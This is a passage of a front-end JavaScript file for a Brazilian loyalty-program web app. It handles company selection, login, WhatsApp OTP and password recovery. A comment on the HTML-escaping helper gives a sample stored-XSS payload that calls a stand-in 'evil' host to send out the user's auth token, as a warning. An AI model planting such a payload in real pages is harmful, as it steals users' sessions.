// ============ CONFIG ============
// Detecta se está em white label (URL com /app/{slug}/)
const WHITELABEL_SLUG = (() => {
    const m = location.pathname.match(/\/app\/([^\/]+)\/?/);
    return m ? m[1] : null;
})();

// Calcula a base do projeto (ex: '/fidelizapro/public') a partir da URL atual.
const APP_BASE = location.pathname.replace(/\/app(\/[^\/]+)?\/?.*$/, '');
const API = APP_BASE + '/api/v1';

const STATE = {
    token: localStorage.getItem('fp_token'),
    cliente: JSON.parse(localStorage.getItem('fp_cliente') || 'null'),
    empresa: window.PRELOAD_EMPRESA || JSON.parse(localStorage.getItem('fp_empresa') || 'null'),
};

// White label: persiste a empresa preloaded no localStorage
if (WHITELABEL_SLUG && window.PRELOAD_EMPRESA) {
    localStorage.setItem('fp_empresa', JSON.stringify(window.PRELOAD_EMPRESA));
}

// ============ HELPERS ============
const $ = (sel) => document.querySelector(sel);
const screenContainer = $('#screen-container');

/**
 * Escapa string para uso seguro em interpolação dentro de innerHTML.
 * Use SEMPRE que renderizar dado vindo do servidor (nome, descrição, código).
 * Sem isso, um valor como `<img src=x onerror=fetch('//evil/'+localStorage.fp_token)>`
 * vira XSS armazenado e rouba o token Sanctum do cliente.
 */
function esc(s) {
    if (s === null || s === undefined) return '';
    return String(s).replace(/[&<>"']/g, c => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
    })[c]);
}
function escAttr(s) { return esc(s); }

function toast(msg, tipo = 'info') {
    const t = $('#toast');
    t.textContent = msg;
    t.classList.remove('hidden', 'bg-emerald-600', 'bg-rose-600', 'bg-slate-900');
    t.classList.add(tipo === 'success' ? 'bg-emerald-600' : tipo === 'error' ? 'bg-rose-600' : 'bg-slate-900');
    setTimeout(() => t.classList.add('hidden'), 2800);
}

// Modal de confirmação no estilo do PWA. Substitui o confirm() nativo.
// Aceita string (mensagem simples) ou objeto { titulo, mensagem, ok, cancelar, tipo, icone }.
// Retorna Promise<boolean>.
function confirmar(opts = {}) {
    if (typeof opts === 'string') opts = { mensagem: opts };
    const {
        titulo = 'Confirmar',
        mensagem = '',
        ok = 'Confirmar',
        cancelar = 'Cancelar',
        tipo = 'default', // 'default' | 'danger'
        icone = tipo === 'danger' ? 'ri-alert-line' : 'ri-question-line',
    } = opts;

    return new Promise((resolve) => {
        const corIcone = tipo === 'danger' ? 'text-rose-600 bg-rose-50' : 'text-white';
        const styleIcone = tipo === 'danger' ? '' : 'background:linear-gradient(135deg,var(--cor-primaria,#6366f1),var(--cor-secundaria,#8b5cf6));';
        const styleBtn = tipo === 'danger'
            ? 'background:#e11d48;'
            : 'background:var(--cor-primaria,#6366f1);';

        const wrap = document.createElement('div');
        wrap.className = 'modal-overlay fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-black/50 backdrop-blur-sm';
        wrap.innerHTML = `
            <div class="modal-sheet bg-white w-full sm:max-w-sm rounded-t-3xl sm:rounded-3xl shadow-2xl overflow-hidden">
                <div class="px-6 pt-6 pb-1 flex items-center gap-3">
                    <div class="w-12 h-12 rounded-2xl ${corIcone} flex items-center justify-center text-2xl shrink-0" style="${styleIcone}">
                        <i class="${icone}"></i>
                    </div>
                    <h3 class="font-bold text-lg text-slate-800 flex-1">${titulo}</h3>
                </div>
                <div class="px-6 pb-5 pt-3">
                    <p class="text-sm text-slate-600 leading-relaxed whitespace-pre-line">${mensagem}</p>
                </div>
                <div class="px-4 pb-5 sm:pb-4 flex gap-2" style="padding-bottom: max(1rem, env(safe-area-inset-bottom));">
                    <button data-acao="cancelar" class="flex-1 py-3 rounded-xl bg-slate-100 text-slate-700 font-semibold text-sm hover:bg-slate-200 active:bg-slate-300 transition">${cancelar}</button>
                    <button data-acao="ok" class="flex-1 py-3 rounded-xl text-white font-semibold text-sm hover:opacity-90 active:opacity-80 transition shadow" style="${styleBtn}">${ok}</button>
                </div>
            </div>
        `;
        document.body.appendChild(wrap);

        const finalizar = (valor) => {
            wrap.classList.add('is-closing');
            document.removeEventListener('keydown', onKey);
            setTimeout(() => wrap.remove(), 150);
            resolve(valor);
        };

        const onKey = (ev) => {
            if (ev.key === 'Escape') finalizar(false);
            if (ev.key === 'Enter') finalizar(true);
        };
        document.addEventListener('keydown', onKey);

        wrap.addEventListener('click', (ev) => {
            const acao = ev.target.closest('[data-acao]')?.dataset.acao;
            if (acao === 'ok') return finalizar(true);
            if (acao === 'cancelar') return finalizar(false);
            if (ev.target === wrap) return finalizar(false); // clique fora
        });
    });
}

async function api(path, opts = {}) {
    const headers = { 'Accept': 'application/json' };
    // FormData precisa do boundary multipart definido pelo browser — não setar Content-Type
    if (!(opts.body instanceof FormData)) headers['Content-Type'] = 'application/json';
    if (STATE.token) headers['Authorization'] = 'Bearer ' + STATE.token;
    const res = await fetch(API + path, { ...opts, headers: { ...headers, ...(opts.headers || {}) } });
    const data = await res.json().catch(() => ({}));
    if (!res.ok) throw new Error(data.message || data.errors?.[Object.keys(data.errors)[0]]?.[0] || 'Erro de comunicação');
    return data;
}

function fmtBRL(v) { return 'R$ ' + Number(v || 0).toFixed(2).replace('.', ','); }
function fmtNum(v) { return Number(v || 0).toLocaleString('pt-BR'); }

function formatarTelefone(v) {
    v = String(v || '').replace(/\D/g, '').slice(0, 11);
    if (!v) return '';
    if (v.length <= 2) return '(' + v;
    if (v.length <= 6) return '(' + v.slice(0, 2) + ') ' + v.slice(2);
    if (v.length <= 10) return '(' + v.slice(0, 2) + ') ' + v.slice(2, 6) + '-' + v.slice(6);
    return '(' + v.slice(0, 2) + ') ' + v.slice(2, 7) + '-' + v.slice(7);
}

// Valida CPF (11 dígitos + dígitos verificadores corretos)
function validarCpf(cpf) {
    cpf = String(cpf || '').replace(/\D/g, '');
    if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
    let soma = 0;
    for (let i = 0; i < 9; i++) soma += parseInt(cpf[i]) * (10 - i);
    let d1 = (soma * 10) % 11; if (d1 === 10) d1 = 0;
    if (d1 !== parseInt(cpf[9])) return false;
    soma = 0;
    for (let i = 0; i < 10; i++) soma += parseInt(cpf[i]) * (11 - i);
    let d2 = (soma * 10) % 11; if (d2 === 10) d2 = 0;
    return d2 === parseInt(cpf[10]);
}

// Valida telefone BR — 10 (fixo) ou 11 (celular) dígitos, DDD entre 11 e 99
function validarTelefone(tel) {
    const d = String(tel || '').replace(/\D/g, '');
    if (d.length !== 10 && d.length !== 11) return false;
    const ddd = parseInt(d.slice(0, 2));
    if (ddd < 11 || ddd > 99) return false;
    // Celular tem que começar com 9 no 3º dígito
    if (d.length === 11 && d[2] !== '9') return false;
    return true;
}

// Aplica máscara em todos inputs de telefone (login, OTP, registrar, indicação)
document.addEventListener('input', (ev) => {
    const el = ev.target;
    if (!el.matches || !el.matches('input[name="telefone"], input[name="telefone_indicado"], #otp-tel')) return;
    const before = el.value;
    const formatted = formatarTelefone(before);
    if (formatted !== before) {
        el.value = formatted;
        // Joga o cursor pro fim — simples e robusto pra colagem
        el.setSelectionRange(formatted.length, formatted.length);
    }
});

function persistir() {
    if (STATE.token) localStorage.setItem('fp_token', STATE.token); else localStorage.removeItem('fp_token');
    if (STATE.cliente) localStorage.setItem('fp_cliente', JSON.stringify(STATE.cliente)); else localStorage.removeItem('fp_cliente');
    if (STATE.empresa) localStorage.setItem('fp_empresa', JSON.stringify(STATE.empresa)); else localStorage.removeItem('fp_empresa');
}

function aplicarTemaEmpresa() {
    if (STATE.empresa) {
        document.documentElement.style.setProperty('--cor-primaria', STATE.empresa.cor_primaria);
        document.documentElement.style.setProperty('--cor-secundaria', STATE.empresa.cor_secundaria);
        document.querySelector('meta[name="theme-color"]').setAttribute('content', STATE.empresa.cor_primaria);
    }
}

// ============ ROTEAMENTO ============
function setNavActive(nome) {
    document.querySelectorAll('.nav-btn').forEach((b, i) => {
        b.classList.toggle('active', ['home','compras','catalogo','qrcode','perfil'][i] === nome);
    });
}

// Rastreia a tela anterior pra botões "Voltar" contextuais.
let telaAnterior = null;
let telaAtual = null;

async function showScreen(nome, params = {}) {
    // White label: a empresa está fixada na URL, então nunca mostra o seletor.
    if (WHITELABEL_SLUG && nome === 'escolherEmpresa') {
        nome = STATE.token ? 'home' : 'login';
    }
    if (!STATE.token && !['login','loginOtp','registrar','escolherEmpresa'].includes(nome)) {
        // White label vai direto pra login (já tem empresa fixada)
        nome = WHITELABEL_SLUG ? 'login' : 'escolherEmpresa';
    }
    if (telaAtual && telaAtual !== nome) {
        telaAnterior = telaAtual;
    }
    telaAtual = nome;

    setNavActive(nome);
    $('#bottom-nav').classList.toggle('hidden', !STATE.token);

    const fns = {
        escolherEmpresa: telaEscolherEmpresa,
        login: telaLogin,
        loginOtp: telaLoginOtp,
        registrar: telaRegistrar,
        home: telaHome,
        compras: telaCompras,
        catalogo: telaCatalogo,
        qrcode: telaQrCode,
        perfil: telaPerfil,
        editarPerfil: telaEditarPerfil,
        alterarSenha: telaAlterarSenha,
        trocarSenha: telaAlterarSenha,
        recuperarSenha: telaRecuperarSenha,
        empresa: telaEmpresa,
        extrato: telaExtrato,
        resgates: telaResgates,
        indicacoes: telaIndicacoes,
        pesquisa: telaPesquisa,
        parceiros: telaParceiros,
        meusCupons: telaMeusCupons,
        roleta: telaRoleta,
        sorteios: telaSorteios,
        historicoSorteios: telaHistoricoSorteios,
    };
    screenContainer.innerHTML = '<div class="flex-1 flex items-center justify-center"><i class="ri-loader-4-line animate-spin text-3xl text-slate-400"></i></div>';
    try {
        await fns[nome](params);
    } catch (e) {
        toast(e.message, 'error');
        if (e.message.toLowerCase().includes('unauthenticated') || e.message.includes('401')) {
            STATE.token = null; STATE.cliente = null; persistir();
            showScreen('escolherEmpresa');
        }
    }
}

// ============ TELAS ============

// Tela 0: escolher empresa
async function telaEscolherEmpresa() {
    const data = await api('/empresas');
    const s = data.sistema || { nome: 'FidelizaPro', slogan: 'Programa de fidelidade', cor_primaria: '#6366f1', cor_secundaria: '#8b5cf6' };
    const inicial = (s.nome || 'F').charAt(0).toUpperCase();
    document.title = s.nome;
    document.documentElement.style.setProperty('--cor-primaria', s.cor_primaria);
    document.documentElement.style.setProperty('--cor-secundaria', s.cor_secundaria);

    const cardEmpresa = (e) => `
        <button onclick='selecionarEmpresa(${JSON.stringify(e).replace(/</g, "\\u003c")})'
                class="empresa-card w-full flex items-center gap-3 p-4 bg-white border border-slate-200 rounded-2xl text-left transition-all hover:shadow-lg hover:-translate-y-0.5 hover:border-transparent active:scale-[0.98]">
            ${e.logo
                ? `<img src="${escAttr(e.logo)}" class="w-14 h-14 rounded-2xl object-contain bg-slate-50 flex-shrink-0 ring-1 ring-slate-100">`
                : `<div class="w-14 h-14 rounded-2xl flex items-center justify-center text-white font-bold text-2xl flex-shrink-0 shadow-sm" style="background:linear-gradient(135deg,${escAttr(e.cor_primaria || '#6366f1')},${escAttr(e.cor_secundaria || '#8b5cf6')})">${esc(String(e.nome || '').charAt(0))}</div>`
            }
            <div class="flex-1 min-w-0">
                <p class="font-semibold text-slate-800 truncate">${esc(e.nome)}</p>
                <p class="text-xs text-slate-500 mt-0.5"><i class="ri-arrow-right-circle-line"></i> Toque para acessar</p>
            </div>
            <div class="w-9 h-9 rounded-full bg-slate-100 flex items-center justify-center text-slate-400 flex-shrink-0">
                <i class="ri-arrow-right-s-line text-xl"></i>
            </div>
        </button>
    `;

    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col bg-slate-50">
        <div class="relative overflow-hidden text-white" style="background:linear-gradient(135deg,${s.cor_primaria},${s.cor_secundaria})">
            <div class="absolute inset-0 opacity-20" style="background-image: radial-gradient(circle at 20% 20%, white 1px, transparent 1px), radial-gradient(circle at 80% 60%, white 1px, transparent 1px); background-size: 40px 40px;"></div>
            <div class="relative px-6 pt-10 pb-16 text-center">
                ${s.logo
                    ? `<img src="${escAttr(s.logo)}" alt="${escAttr(s.nome)}" class="w-20 h-20 mx-auto rounded-2xl bg-white/15 backdrop-blur p-2 mb-4 object-contain shadow-lg ring-1 ring-white/20">`
                    : `<div class="w-20 h-20 mx-auto rounded-2xl bg-white/15 backdrop-blur flex items-center justify-center text-4xl font-bold mb-4 shadow-lg ring-1 ring-white/20">${esc(inicial)}</div>`
                }
                <h1 class="text-3xl font-bold tracking-tight">${esc(s.nome)}</h1>
                <p class="text-white/85 text-sm mt-1.5">${esc(s.slogan || 'Programa de fidelidade')}</p>
            </div>
        </div>

        <div class="px-4 -mt-8 pb-6">
            <div class="bg-white rounded-2xl shadow-sm border border-slate-100 p-4 mb-4">
                <div class="relative">
                    <i class="ri-search-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                    <input id="busca-empresa" type="text" placeholder="Buscar empresa..."
                           class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition text-sm">
                </div>
                <p class="text-xs text-slate-500 mt-2 px-1">
                    <i class="ri-store-2-line"></i> ${data.empresas.length}
                    ${data.empresas.length === 1 ? 'empresa disponível' : 'empresas disponíveis'}
                </p>
            </div>

            <div id="lista-empresas" class="space-y-2.5">
                ${data.empresas.length === 0 ? `
                    <div class="bg-white rounded-2xl shadow-sm border border-slate-100 p-10 text-center">
                        <div class="w-16 h-16 mx-auto rounded-full bg-slate-100 flex items-center justify-center mb-3">
                            <i class="ri-store-2-line text-3xl text-slate-400"></i>
                        </div>
                        <p class="text-sm text-slate-700 font-semibold mb-1">Nenhuma empresa disponível</p>
                        <p class="text-xs text-slate-500">Volte mais tarde — novas empresas chegando.</p>
                    </div>
                ` : data.empresas.map(cardEmpresa).join('')}
            </div>
            <div id="lista-empresas-vazia" class="hidden bg-white rounded-2xl shadow-sm border border-slate-100 p-8 text-center">
                <div class="w-12 h-12 mx-auto rounded-full bg-slate-100 flex items-center justify-center mb-2">
                    <i class="ri-search-line text-2xl text-slate-400"></i>
                </div>
                <p class="text-sm text-slate-500">Nenhuma empresa encontrada</p>
            </div>
        </div>

        <p class="text-center text-[11px] text-slate-400 pb-6 px-4">
            Powered by <span class="font-semibold text-slate-500">${esc(s.nome)}</span>
        </p>
    </div>`;

    // Filtro local de busca
    const input = document.getElementById('busca-empresa');
    if (input) {
        input.addEventListener('input', () => {
            const termo = input.value.toLowerCase().trim();
            const empresas = data.empresas.filter(e => e.nome.toLowerCase().includes(termo));
            const lista = document.getElementById('lista-empresas');
            const vazia = document.getElementById('lista-empresas-vazia');
            if (empresas.length === 0 && termo) {
                lista.classList.add('hidden');
                vazia.classList.remove('hidden');
            } else {
                lista.classList.remove('hidden');
                vazia.classList.add('hidden');
                lista.innerHTML = empresas.map(cardEmpresa).join('');
            }
        });
    }
}

window.selecionarEmpresa = (e) => {
    STATE.empresa = e;
    persistir();
    aplicarTemaEmpresa();
    showScreen('login');
};

// Tela 1: Login
async function telaLogin() {
    const e = STATE.empresa;
    const cor = e?.cor_primaria || '#6366f1';
    const corSec = e?.cor_secundaria || '#8b5cf6';
    const semWhitelabel = !WHITELABEL_SLUG;
    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col">
        <div class="p-6 pb-10 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
            ${semWhitelabel ? `<button onclick="showScreen('escolherEmpresa')" class="text-white/80 mb-3 flex items-center gap-1 text-sm hover:text-white transition"><i class="ri-arrow-left-line"></i> Trocar empresa</button>` : ''}
            ${e?.logo
                ? `<img src="${escAttr(e.logo)}" alt="${escAttr(e.nome)}" class="w-16 h-16 rounded-2xl bg-white/20 backdrop-blur p-2 mb-3 object-contain">`
                : `<div class="w-16 h-16 rounded-2xl bg-white/20 backdrop-blur flex items-center justify-center text-3xl font-bold mb-3">${esc((e?.nome || 'F')[0])}</div>`
            }
            <h1 class="text-2xl font-bold">${esc(e?.nome || 'FidelizaPro')}</h1>
            <p class="text-white/80 text-sm">Acesse seu programa de fidelidade</p>
        </div>
        <form id="form-login" class="p-6 -mt-4 bg-white rounded-t-3xl space-y-4 flex-1">
            <div>
                <label class="block text-sm font-medium text-slate-700 mb-1.5">Telefone</label>
                <div class="relative">
                    <i class="ri-smartphone-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                    <input name="telefone" required placeholder="(11) 99999-9999"
                           class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                </div>
            </div>

            <div>
                <label class="block text-sm font-medium text-slate-700 mb-1.5">Senha</label>
                <div class="relative">
                    <i class="ri-lock-2-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                    <input name="password" type="password" required placeholder="Sua senha"
                           class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                </div>
            </div>

            <button class="w-full py-3.5 text-white rounded-xl font-semibold shadow-md hover:shadow-xl transition flex items-center justify-center gap-2"
                    style="background:linear-gradient(135deg,${cor},${corSec})">
                Entrar <i class="ri-arrow-right-line"></i>
            </button>

            <div class="relative my-2">
                <div class="absolute inset-0 flex items-center"><div class="w-full border-t border-slate-200"></div></div>
                <div class="relative flex justify-center text-xs"><span class="bg-white px-3 text-slate-400 uppercase tracking-wide">ou</span></div>
            </div>

            <button type="button" onclick="showScreen('loginOtp')"
                    class="w-full py-3 border-2 border-emerald-500 text-emerald-600 rounded-xl font-semibold flex items-center justify-center gap-2 hover:bg-emerald-50 transition">
                <i class="ri-whatsapp-line text-xl"></i> Entrar com WhatsApp
            </button>

            <p class="text-center text-sm pt-1">
                <a onclick="showScreen('recuperarSenha')" class="cursor-pointer text-slate-500 hover:text-slate-700 hover:underline">
                    Esqueci minha senha
                </a>
            </p>

            <p class="text-center text-sm text-slate-500 pt-3">
                Novo por aqui? <a onclick="showScreen('registrar')" class="font-semibold cursor-pointer hover:underline" style="color:${cor}">Criar conta</a>
            </p>

            <p class="text-center text-[11px] text-slate-400 pt-3 mt-2 border-t border-slate-100">
                <a href="/termos-de-uso" target="_blank" class="hover:underline">Termos de uso</a>
                &middot;
                <a href="/politica-privacidade" target="_blank" class="hover:underline">Política de privacidade</a>
            </p>
        </form>
    </div>`;
    $('#form-login').addEventListener('submit', async (ev) => {
        ev.preventDefault();
        const fd = Object.fromEntries(new FormData(ev.target));
        try {
            const res = await api('/auth/login', {
                method: 'POST',
                body: JSON.stringify({ ...fd, empresa_slug: STATE.empresa.slug }),
            });
            STATE.token = res.token;
            STATE.cliente = res.cliente;
            STATE.empresa = res.empresa;
            persistir();
            aplicarTemaEmpresa();
            toast('Bem-vindo, '+ res.cliente.nome.split(' ')[0] + '!', 'success');
            if (res.cliente.senha_temporaria) {
                showScreen('trocarSenha');
            } else {
                showScreen('home');
            }
        } catch (e) { toast(e.message, 'error'); }
    });
}

// Tela 1.5: Login por OTP via WhatsApp
async function telaLoginOtp() {
    const e = STATE.empresa;
    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col bg-slate-50">
        <div class="px-5 pt-6 pb-10 text-white" style="background:linear-gradient(135deg,#10b981,#059669)">
            <button onclick="showScreen('login')" class="text-white/80 mb-3 flex items-center gap-1 text-sm hover:text-white transition">
                <i class="ri-arrow-left-line"></i> Voltar
            </button>
            <div class="w-14 h-14 rounded-2xl bg-white/20 backdrop-blur flex items-center justify-center text-3xl mb-3">
                <i class="ri-whatsapp-line"></i>
            </div>
            <h1 class="text-2xl font-bold">Entrar com WhatsApp</h1>
            <p class="text-white/80 text-sm mt-1">Receba um código de 6 dígitos no seu WhatsApp</p>
        </div>

        <div id="otp-fase-1" class="px-4 -mt-6 pb-6">
            <div class="bg-white rounded-2xl shadow-md border border-slate-100 p-5 space-y-4">
                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Telefone com DDD</label>
                    <div class="relative">
                        <i class="ri-smartphone-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                        <input id="otp-tel" type="tel" required placeholder="(11) 99999-9999"
                               class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-emerald-400 focus:outline-none transition">
                    </div>
                    <p class="text-[11px] text-slate-500 mt-1 ml-1">O número precisa estar cadastrado nesta empresa</p>
                </div>

                <button onclick="solicitarOtp()" id="otp-btn-solicitar"
                        class="w-full py-3.5 text-white rounded-xl font-semibold flex items-center justify-center gap-2 shadow-md hover:shadow-lg transition"
                        style="background:linear-gradient(135deg,#10b981,#059669)">
                    <i class="ri-send-plane-line"></i> Enviar código
                </button>
            </div>
        </div>

        <div id="otp-fase-2" class="px-4 -mt-6 pb-6 hidden">
            <div class="bg-white rounded-2xl shadow-md border border-slate-100 p-5 space-y-4">
                <p class="text-sm text-slate-700 text-center">
                    Código enviado para <strong id="otp-tel-show" class="text-emerald-600"></strong>
                </p>

                <input id="otp-codigo" type="text" inputmode="numeric" maxlength="6" placeholder="000000"
                       class="w-full px-4 py-4 bg-slate-50 border-2 border-slate-200 rounded-xl text-center text-3xl font-mono tracking-[0.5em] focus:bg-white focus:border-emerald-400 focus:outline-none transition">

                <button onclick="validarOtp()"
                        class="w-full py-3.5 text-white rounded-xl font-semibold shadow-md hover:shadow-lg transition flex items-center justify-center gap-2"
                        style="background:linear-gradient(135deg,#10b981,#059669)">
                    <i class="ri-check-line"></i> Confirmar código
                </button>

                <div class="flex justify-between text-sm pt-1 border-t border-slate-100 -mx-1">
                    <button onclick="resetOtp()" class="text-slate-500 hover:text-slate-700 px-2 pt-3">
                        <i class="ri-arrow-left-line"></i> Trocar telefone
                    </button>
                    <button onclick="solicitarOtp(true)" id="otp-btn-reenviar" class="text-emerald-600 font-semibold hover:underline px-2 pt-3">
                        Reenviar
                    </button>
                </div>

                <p id="otp-dev" class="text-xs text-amber-600 text-center font-mono"></p>
            </div>
        </div>
    </div>`;
}

// Tela 1.6: Recuperar senha (esqueci minha senha) — usa o mesmo OTP via
// WhatsApp e troca a senha em um único request no fim.
async function telaRecuperarSenha() {
    const e = STATE.empresa;
    const cor = e?.cor_primaria || '#6366f1';
    const corSec = e?.cor_secundaria || '#8b5cf6';
    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col bg-slate-50">
        <div class="px-5 pt-6 pb-10 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
            <button onclick="showScreen('login')" class="text-white/80 mb-3 flex items-center gap-1 text-sm hover:text-white transition">
                <i class="ri-arrow-left-line"></i> Voltar
            </button>
            <div class="w-14 h-14 rounded-2xl bg-white/20 backdrop-blur flex items-center justify-center text-3xl mb-3">
                <i class="ri-lock-unlock-line"></i>
            </div>
            <h1 class="text-2xl font-bold">Recuperar senha</h1>
            <p class="text-white/80 text-sm mt-1">Enviaremos um código no seu WhatsApp pra você definir uma nova senha</p>
        </div>

        <div id="rec-fase-1" class="px-4 -mt-6 pb-6">
            <div class="bg-white rounded-2xl shadow-md border border-slate-100 p-5 space-y-4">
                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Telefone com DDD</label>
                    <div class="relative">
                        <i class="ri-smartphone-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                        <input id="rec-tel" name="telefone" type="tel" required placeholder="(11) 99999-9999"
                               class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                    </div>
                </div>
                <button onclick="recSolicitar()" id="rec-btn-enviar"
                        class="w-full py-3.5 text-white rounded-xl font-semibold flex items-center justify-center gap-2 shadow-md hover:shadow-lg transition"
                        style="background:linear-gradient(135deg,${cor},${corSec})">
                    <i class="ri-send-plane-line"></i> Enviar código
                </button>
            </div>
        </div>

        <div id="rec-fase-2" class="px-4 -mt-6 pb-6 hidden">
            <div class="bg-white rounded-2xl shadow-md border border-slate-100 p-5 space-y-4">
                <p class="text-sm text-slate-700 text-center">
                    Código enviado para <strong id="rec-tel-show" style="color:${cor}"></strong>
                </p>

                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Código recebido</label>
                    <input id="rec-codigo" type="text" inputmode="numeric" maxlength="6" placeholder="000000"
                           class="w-full px-4 py-4 bg-slate-50 border-2 border-slate-200 rounded-xl text-center text-2xl font-mono tracking-[0.4em] focus:bg-white focus:border-slate-400 focus:outline-none transition">
                </div>

                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Nova senha</label>
                    <div class="relative">
                        <i class="ri-lock-2-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                        <input id="rec-senha" type="password" minlength="6" placeholder="Mínimo 6 caracteres"
                               class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                    </div>
                </div>

                <div>
                    <label class="block text-sm font-medium text-slate-700 mb-1.5">Confirmar nova senha</label>
                    <div class="relative">
                        <i class="ri-lock-2-line absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                        <input id="rec-senha2" type="password" minlength="6" placeholder="Repita a senha"
                               class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl focus:bg-white focus:border-slate-400 focus:outline-none transition">
                    </div>
                </div>

                <button onclick="recConfirmar()" id="rec-btn-confirmar"
                        class="w-full py-3.5 text-white rounded-xl font-semibold shadow-md hover:shadow-lg transition flex items-center justify-center gap-2"
                        style="background:linear-gradient(135deg,${cor},${corSec})">
                    <i class="ri-shield-keyhole-line"></i> Redefinir senha
                </button>

                <div class="flex justify-between text-sm pt-1 border-t border-slate-100 -mx-1">
                    <button onclick="recReset()" class="text-slate-500 hover:text-slate-700 px-2 pt-3">
                        <i class="ri-arrow-left-line"></i> Trocar telefone
                    </button>
                    <button onclick="recSolicitar(true)" id="rec-btn-reenviar" class="font-semibold hover:underline px-2 pt-3" style="color:${cor}">
                        Reenviar código
                    </button>
                </div>

                <p id="rec-dev" class="text-xs text-amber-600 text-center font-mono"></p>
            </div>
        </div>
    </div>`;
}

window.recSolicitar = async (reenviar = false) => {
    const tel = $('#rec-tel').value.trim();
    if (!validarTelefone(tel)) return toast('Telefone inválido', 'error');

    const btn = $(reenviar ? '#rec-btn-reenviar' : '#rec-btn-enviar');
    if (btn?.disabled) return;
    if (btn) { btn.disabled = true; }

    try {
        const res = await api('/auth/otp/solicitar', {
            method: 'POST',
            body: JSON.stringify({ telefone: tel, empresa_slug: STATE.empresa.slug }),
        });
        if (!reenviar) {
            $('#rec-fase-1').classList.add('hidden');
            $('#rec-fase-2').classList.remove('hidden');
            $('#rec-tel-show').textContent = tel;
            setTimeout(() => $('#rec-codigo').focus(), 100);
        } else {
            toast('Código reenviado!', 'success');
        }
        if (res.codigo_dev) $('#rec-dev').textContent = `🧪 Modo dev: código = ${res.codigo_dev}`;
        // cooldown de 30s no reenvio
        const reB = $('#rec-btn-reenviar');
        if (reB) {
            let s = 30; reB.disabled = true;
            const label = reB.textContent;
            const timer = setInterval(() => {
                reB.textContent = `Reenviar em ${s}s`;
                if (--s < 0) { clearInterval(timer); reB.disabled = false; reB.textContent = label; }
            }, 1000);
        }
    } catch (e) {
        toast(e.message, 'error');
    } finally {
        if (btn && !reenviar) btn.disabled = false;
    }
};

window.recConfirmar = async () => {
    const tel    = $('#rec-tel').value.trim();
    const codigo = $('#rec-codigo').value.trim();
    const s1     = $('#rec-senha').value;
    const s2     = $('#rec-senha2').value;

    if (codigo.length !== 6) return toast('Código deve ter 6 dígitos', 'error');
    if (s1.length < 6) return toast('Senha precisa ter pelo menos 6 caracteres', 'error');
    if (s1 !== s2) return toast('As senhas não conferem', 'error');

    const btn = $('#rec-btn-confirmar');
    const labelOrig = btn.innerHTML;
    btn.disabled = true;
    btn.innerHTML = '<i class="ri-loader-4-line animate-spin"></i> Redefinindo...';
    try {
        const res = await api('/auth/recuperar-senha', {
            method: 'POST',
            body: JSON.stringify({
                telefone: tel,
                codigo,
                senha_nova: s1,
                senha_nova_confirmation: s2,
                empresa_slug: STATE.empresa.slug,
            }),
        });
        STATE.token = res.token;
        STATE.cliente = res.cliente;
        STATE.empresa = res.empresa;
        persistir(); aplicarTemaEmpresa();
        toast('Senha redefinida! Bem-vindo de volta.', 'success');
        showScreen('home');
    } catch (e) {
        toast(e.message, 'error');
        btn.disabled = false;
        btn.innerHTML = labelOrig;
    }
};

window.recReset = () => {
    $('#rec-fase-1').classList.remove('hidden');
    $('#rec-fase-2').classList.add('hidden');
    $('#rec-codigo').value = '';
    $('#rec-senha').value = '';
    $('#rec-senha2').value = '';
    $('#rec-dev').textContent = '';
};

window.solicitarOtp = async (reenviar = false) => {
    const tel = $('#otp-tel').value.trim();
    if (!tel) return toast('Informe o telefone', 'error');

    const btnReenviar = $('#otp-btn-reenviar');
    if (reenviar && btnReenviar?.disabled) return; // já em cooldown

    try {
        const res = await api('/auth/otp/solicitar', {
            method: 'POST',
            body: JSON.stringify({ telefone: tel, empresa_slug: STATE.empresa.slug }),
        });
        if (!reenviar) {
            $('#otp-fase-1').classList.add('hidden');
            $('#otp-fase-2').classList.remove('hidden');
            $('#otp-tel-show').textContent = tel;
            setTimeout(() => $('#otp-codigo').focus(), 100);
        } else {
            toast('Código reenviado!', 'success');
        }
        if (res.codigo_dev) {
            $('#otp-dev').textContent = `🧪 Modo dev: código = ${res.codigo_dev}`;
        }
        iniciarCooldownReenvio(30);
    } catch (e) { toast(e.message, 'error'); }
};

function iniciarCooldownReenvio(segundos) {
    const btn = $('#otp-btn-reenviar');
    if (!btn) return;
    let restante = segundos;
    const textoOriginal = 'Reenviar';
    btn.disabled = true;
    btn.classList.add('text-slate-400', 'cursor-not-allowed');
    btn.classList.remove('text-emerald-600', 'hover:underline');

